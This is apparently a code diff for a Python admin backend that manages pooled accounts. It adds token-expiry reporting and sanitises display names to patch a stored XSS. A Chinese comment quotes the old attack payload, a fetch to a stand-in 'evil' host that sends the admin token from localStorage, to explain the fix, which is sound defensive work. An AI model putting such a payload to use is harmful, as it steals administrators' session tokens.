@@ -18,7 +18,7 @@ from admin.credential_codec import CredentialDecodeError, encrypt_credential, no
 from admin.config import settings
 from admin.db import SessionLocal, get_db
 from admin.models import Account, AccountModelCooldown, ApiKey, ModelConfig, UsageLog
-from admin.security import require_admin
+from admin.security import require_admin, clean_display_name
 
 router = APIRouter(prefix="/api/accounts", tags=["accounts"])
 
@@ -314,13 +314,17 @@ def _apply_meta(acc: Account, auth_json: str, profile: dict | None = None,
         acc.last_sync_at = datetime.utcnow()
     # 号池名称：上游真实昵称 → 上游手机号 → 凭证昵称 → uid
     # （昵称为 null/空串/"null" 一律视为缺失）
-    def _clean(v) -> str:
-        s = (v if isinstance(v, str) else "").strip()
-        return "" if s.lower() in ("null", "none") else s
-
+    #
+    # ⚠️ 昵称是**提交者可控**的：他可以把自己的 WorkBuddy 昵称改成任意字符串，
+    # 而它会被渲染进后台账号行。历史上这里是原样入库，导致 stored XSS
+    # （`');fetch('//evil/…',localStorage.wb_admin_token)//` 偷后台令牌）。
+    # 现在统一过 clean_display_name：只留纯文本，元字符全部剔除。
     if not acc.name:
-        acc.name = (_clean(prof.get("nickname")) or _clean(prof.get("phoneNumber"))
-                    or _clean(meta.get("nickname")) or uid or "未命名")
+        acc.name = (clean_display_name(prof.get("nickname"))
+                    or clean_display_name(prof.get("phoneNumber"))
+                    or clean_display_name(meta.get("nickname"))
+                    or clean_display_name(uid)
+                    or "未命名")
 
 
 #: 「快过期积分」的判定窗口（天）。
@@ -570,6 +574,7 @@ def list_accounts(request: Request = None,
             "resource_initialization": resources.get(a.id),
             **_gateway_fields(a, now),
             **_credit_fields(a),
+            **_token_fields(a),
         }
         for a in rows
     ]
@@ -587,6 +592,8 @@ def list_accounts(request: Request = None,
     # 这样既不污染「可用」，又不至于让人以为数据丢了。
     active_items = [i for i in items if i["status"] == "active"]
     disabled_items = [i for i in items if i["status"] != "active"]
+    # 令牌统计的样本：只看支持这套凭证结构的平台（见 `_token_fields`）。
+    token_items = [i for i in active_items if i.get("token_supported")]
     summary = {
         "total": len(items),
         "active": len(active_items),
@@ -604,12 +611,77 @@ def list_accounts(request: Request = None,
             (i["credits_soonest_expire_at"] for i in active_items
              if i["credits_soonest_expire_at"]),
             default=None),
+        # —— 令牌有效期（只看 active：禁用号是否过期已无意义）——
+        #
+        # 这里必须给**两条**时间线的汇总，不能只报 access：
+        # access 是 30 天的短周期、过期后一道刷新就回来，它「快到期」其实
+        # 是正常状态；真正决定账号死活的是 refresh 窗口（60 天）。只盯着
+        # token_expiring 会让人天天看到「剩 N 天」而实际一点事没有。
+        #
+        # 统计范围：只算 `token_supported=True` 的号（当前即 WorkBuddy）。
+        # 别的平台凭证形状不同（顶层 token / expiredAt），解析必然 unknown ——
+        # 把它们算进来会让「6 个号有效期未知」这种假警报常年亮着。
+        "token_expiring": sum(1 for i in token_items if i["token_state"] == "expiring"),
+        "token_expired": sum(1 for i in token_items if i["token_state"] == "expired"),
+        "token_unknown": sum(1 for i in token_items if i["token_state"] == "unknown"),
+        "token_soonest_expire_at": min(
+            (i["token_expires_at"] for i in token_items if i["token_expires_at"]),
+            default=None),
+        #: 续期窗口（refreshToken）—— 真正的死亡线
+        "renewal_expiring": sum(
+            1 for i in token_items if i["renewal_state"] == "expiring"),
+        "renewal_expired": sum(
+            1 for i in token_items if i["renewal_state"] == "expired"),
+        "renewal_unknown": sum(
+            1 for i in token_items if i["renewal_state"] == "unknown"),
+        "renewal_soonest_expire_at": min(
+            (i["renewal_expires_at"] for i in token_items if i["renewal_expires_at"]),
+            default=None),
+        #: 还能靠刷新救回来的号数 —— 跑一次保活就复活，不需要人工重登。
+        "renewable_accounts": sum(1 for i in token_items if i.get("renewable")),
         # —— 已禁用账号那部分：透明展示，但不计入上面的「可用」——
         "disabled_balance_remain": sum(i["balance_remain"] for i in disabled_items),
         "disabled_credits_expiring_soon": sum(
             i["credits_expiring_soon"] for i in disabled_items),
     }
     return {"items": items, "summary": summary}
+
+
+def _token_fields(a: Account) -> dict:
+    """令牌有效期视图（读时解析，不落库）。
+
+    两条时间线都要给，理由见平台模块的 credential_expiry 注释：
+    短期令牌（30 天）过期后刷新即可复活；续期窗口（60 天滑动）才是真正的
+    死亡线。前端据此显示两种不同颜色的徽标。
+
+    **平台无关**：具体怎么解析由各平台的 Gateway 决定
+    （`Gateway.credential_expiry`），本函数只负责把结果摊平成前端字段。
+    不支持这个能力的平台会拿到 `token_supported=False`，前端据此不渲染
+    任何徽标 —— 而不是给一批正常账号挂上红色「无法解析」。
+
+    解析失败（凭证格式异常、本机无解密密钥）时降级为 `unknown`，
+    **绝不因为一个坏号让整页列表 500**。
+    """
+    from admin.credential_expiry import credential_expiry
+
+    info = credential_expiry(a)
+    expires_at = info.get("expires_at")
+    refresh_at = info.get("refresh_expires_at")
+    return {
+        "token_supported": bool(info.get("supported")),
+        # —— 线一：短期令牌 ——
+        "token_expires_at": expires_at.isoformat() if expires_at else None,
+        "token_days_left": info.get("days_left"),
+        "token_state": info.get("state"),
+        # —— 线二：续期窗口 ——
+        "renewal_expires_at": refresh_at.isoformat() if refresh_at else None,
+        "renewal_days_left": info.get("refresh_days_left"),
+        "renewal_state": info.get("refresh_state"),
+        "renewal_known": info.get("renewal_known", False),
+        # —— 综合：这个号还能不能靠刷新救回来 ——
+        "renewable": info.get("renewable", False),
+        "has_refresh_token": info.get("has_refresh", False),
+    }
 
 
 def _gateway_fields(a: Account, now: datetime) -> dict:
@@ -773,7 +845,7 @@ def add_account(body: AccountIn, _: bool = Depends(require_admin), db: Session =
         return {"id": dup.id, "name": dup.name, "ok": True,
                 "duplicated": True,
                 "message": f"该账号已存在（id={dup.id}），已用新凭证覆盖更新"}
-    acc = Account(name=body.name) if body.name else Account()
+    acc = Account(name=clean_display_name(body.name)) if body.name else Account()
     _apply_meta(acc, body.auth_json, profile=profile, balance=balance)
     db.add(acc)
     db.commit()
@@ -873,7 +945,7 @@ def batch_add(body: AccountBatchIn, _: bool = Depends(require_admin), db: Sessio
             _post_login_automation(old.id, old.name or old.uid)
             skipped += 1
             continue
-        acc = Account(name=it.name) if it.name else Account()
+        acc = Account(name=clean_display_name(it.name)) if it.name else Account()
         _apply_meta(acc, it.auth_json, profile=profile, balance=balance)
         db.add(acc)
         db.commit()
@@ -1833,7 +1905,8 @@ def patch_account(
         else:
             raise HTTPException(400, "并发上限必须是非负整数；留空跟随全局，0 表示不限")
     if "name" in body:
-        acc.name = body["name"]
+        # 改名同样要清洗：这里以前是原样写库，等于给「改个名」开了同一条 XSS。
+        acc.name = clean_display_name(body["name"], acc.name)
     if "status" in body and body["status"] in ("active", "disabled"):
         acc.status = body["status"]
         if acc.status == "disabled":
